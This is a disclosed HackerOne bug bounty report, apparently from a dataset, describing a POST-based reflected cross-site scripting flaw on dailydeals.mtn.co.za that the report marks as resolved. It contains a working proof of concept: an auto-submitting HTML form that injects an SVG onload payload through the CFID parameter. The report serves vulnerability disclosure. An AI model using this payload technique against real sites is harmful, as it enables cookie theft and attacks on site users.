---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1451394'
original_report_id: '1451394'
title: POST BASED REFLECTED XSS IN dailydeals.mtn.co.za
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2022-01-17T11:44:48.880Z'
disclosed_at: '2022-07-15T09:56:35.123Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 34
asset_identifier: mtnblog.co.za
asset_type: URL
max_severity: none
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# POST BASED REFLECTED XSS IN dailydeals.mtn.co.za

## Metadata

- HackerOne Report ID: 1451394
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-07-15T09:56:35.123Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Dear Team ,
I have found a post based reflected XSS in https://dailydeals.mtn.co.za/ .

## Steps To Reproduce:

1.Create a html file with following content .

<form action="https://dailydeals.mtn.co.za/index.cfm?GO=CRAVE_ESTABLISHMENTS_LIST" method="POST"><input type="hidden" name="location_id" value="0"><input type="hidden" name="suburb" value="0"><input type="hidden" name="search_phrase" value=""><input type="hidden" name="submit_search" value="Search"><input type="hidden" name="m" value=""><input type="hidden" name="cpID" value=""><input type="hidden" name="CFID" value="a611fd5d-822a-4c08-a032-bcac1551f032'&quot;<!--><Svg OnLoad=(confirm)(1)-->"><input type="hidden" name="CFTOKEN" value="0"></form><script>document.forms[0].submit()</script>

2.Open the HTML file in any web-browser. 
  
3.Cross site Scripting will be triggered .

## Impact

Attacker can exploit this vulnerability to steal users cookies , redirect them to arbitrary domain and perform various attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
